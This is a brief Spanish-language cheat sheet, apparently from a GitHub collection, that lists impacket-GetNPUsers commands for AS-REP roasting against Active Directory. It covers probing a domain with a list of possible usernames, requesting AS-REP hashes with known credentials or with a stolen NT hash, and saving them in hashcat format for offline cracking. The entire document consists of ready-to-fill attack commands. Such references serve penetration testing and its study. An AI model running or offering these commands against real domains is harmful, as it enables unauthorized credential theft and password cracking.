# GetNPUsers Cheat Sheet

#### Ataque TGT usando un archivo de listado de posbles usuarios
```
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile <FILE-USERS>
```

#### ASRepRoast Attack - con usuario y contraseña que tengamos
```
impacket-GetNPUsers -dc-ip <IP> -request -outputfile ASREProastables.txt <DOMAIN>/<USER>
```

#### ASRepRoast Attack - con usuario y contraseña que tengamos y obteniendo el resultado en formato HashCat
```
impacket-GetNPUsers -dc-ip <IP> -request -format hashcat -outputfile ASREProastables.txt <DOMAIN>/<USER>
```

#### ASRepRoast Attack - usando Hash NT de un usuario que tengamos
```
impacket-GetNPUsers -dc-ip <IP> -request -outputfile ASREProastables.txt -hashes '<LM-HASH>:<NT-HASH>' <DOMAIN>/<USER>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)